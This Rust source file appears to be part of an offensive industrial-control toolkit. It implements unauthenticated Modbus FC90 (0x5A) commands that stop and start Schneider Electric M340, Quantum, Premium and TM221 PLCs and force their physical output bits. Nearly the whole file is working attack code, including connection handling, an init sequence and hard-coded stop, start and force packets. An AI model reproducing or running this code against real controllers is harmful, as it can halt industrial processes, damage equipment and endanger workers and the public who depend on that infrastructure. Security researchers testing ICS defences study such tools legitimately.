/// Schneider Electric Modicon FC90 (function code 0x5A) proprietary unauthenticated PLC control.
///
/// Targets M340, Quantum, Premium, and TM221 PLCs via port 502.
/// No authentication required. Sourced from ISF (ICS Security Framework) modbus_fc90 module
/// and public ICS-Security-Tools research.
use anyhow::Result;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

const FC90_PORT: u16 = 502;
const TIMEOUT: Duration = Duration::from_secs(5);

/// Output force state for FC90 output forcing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ForceState {
    On,
    Off,
    Unforce,
}

/// `port = 0` → use FC90_PORT (502).
fn connect(ip: &str, port: u16) -> Result<TcpStream> {
    let effective_port = if port == 0 { FC90_PORT } else { port };
    let addr = format!("{ip}:{effective_port}");
    let stream = TcpStream::connect_timeout(&addr.parse()?, TIMEOUT)?;
    stream.set_read_timeout(Some(TIMEOUT))?;
    stream.set_write_timeout(Some(TIMEOUT))?;
    Ok(stream)
}

fn send_recv_fc90(stream: &mut TcpStream, data: &[u8]) -> Option<Vec<u8>> {
    stream.write_all(data).ok()?;
    let mut buf = [0u8; 256];
    let n = stream.read(&mut buf).ok()?;
    if n == 0 {
        return None;
    }
    Some(buf[..n].to_vec())
}

/// Send the 30-frame FC90 init sequence required by M340/Quantum/Premium before stop/start.
/// Each frame uses subcommand 0x01 with a sequentially incrementing parameter byte.
fn init_sequence(stream: &mut TcpStream) {
    for i in 0u8..30 {
        let pkt = [0x00u8, 0x5A, 0x01, i, 0xFF, 0x00];
        let _ = send_recv_fc90(stream, &pkt);
    }
}

fn check_ack(resp: &[u8]) -> bool {
    // ACK: 00 5a 01 04
    resp.len() >= 4 && resp[0] == 0x00 && resp[1] == 0x5A && resp[3] == 0x04
}

/// Stop an M340, Quantum, or Premium PLC via unauthenticated FC90.
/// Pass `port = 0` to use the default Modbus port (502).
pub fn stop_plc(ip: &str, port: u16) -> Result<bool> {
    let mut stream = connect(ip, port)?;
    init_sequence(&mut stream);
    let stop = [0x00u8, 0x5A, 0x01, 0x41, 0xFF, 0x00];
    let resp = send_recv_fc90(&mut stream, &stop)
        .ok_or_else(|| anyhow::anyhow!("no response from FC90 stop on {ip}"))?;
    Ok(check_ack(&resp))
}

/// Start an M340, Quantum, or Premium PLC via unauthenticated FC90.
/// Pass `port = 0` to use the default Modbus port (502).
pub fn start_plc(ip: &str, port: u16) -> Result<bool> {
    let mut stream = connect(ip, port)?;
    init_sequence(&mut stream);
    let start = [0x00u8, 0x5A, 0x01, 0x40, 0xFF, 0x00];
    let resp = send_recv_fc90(&mut stream, &start)
        .ok_or_else(|| anyhow::anyhow!("no response from FC90 start on {ip}"))?;
    Ok(check_ack(&resp))
}

/// Stop a TM221 (SoMachine Basic) PLC. No init sequence required.
pub fn stop_tm221(ip: &str, port: u16) -> Result<bool> {
    let mut stream = connect(ip, port)?;
    let stop = [0x01u8, 0x5A, 0xC9, 0x41, 0xFF, 0x00];
    let resp = send_recv_fc90(&mut stream, &stop)
        .ok_or_else(|| anyhow::anyhow!("no response from FC90 TM221 stop on {ip}"))?;
    Ok(resp.len() >= 4 && resp[1] == 0x5A)
}

/// Start a TM221 (SoMachine Basic) PLC. No init sequence required.
pub fn start_tm221(ip: &str, port: u16) -> Result<bool> {
    let mut stream = connect(ip, port)?;
    let start = [0x01u8, 0x5A, 0xC9, 0x40, 0xFF, 0x00];
    let resp = send_recv_fc90(&mut stream, &start)
        .ok_or_else(|| anyhow::anyhow!("no response from FC90 TM221 start on {ip}"))?;
    Ok(resp.len() >= 4 && resp[1] == 0x5A)
}

/// Force a physical output bit via FC90 subcommand 0x71.
///
/// `output_byte`: 0x11=Q0.17, 0x12=Q0.18, 0x13=Q0.19, 0x14=Q0.20, 0x15=Q0.21, 0x16=Q0.22
pub fn force_output_bit(ip: &str, port: u16, output_byte: u8, state: ForceState) -> Result<bool> {
    let state_byte: u8 = match state {
        ForceState::On => 0x01,
        ForceState::Off => 0x02,
        ForceState::Unforce => 0x04,
    };
    let mut stream = connect(ip, port)?;
    init_sequence(&mut stream);
    let pkt = [0x00u8, 0x5A, 0x71, output_byte, state_byte, 0x00];
    let resp = send_recv_fc90(&mut stream, &pkt)
        .ok_or_else(|| anyhow::anyhow!("no response from FC90 force-output on {ip}"))?;
    Ok(resp.len() >= 4 && resp[1] == 0x5A)
}
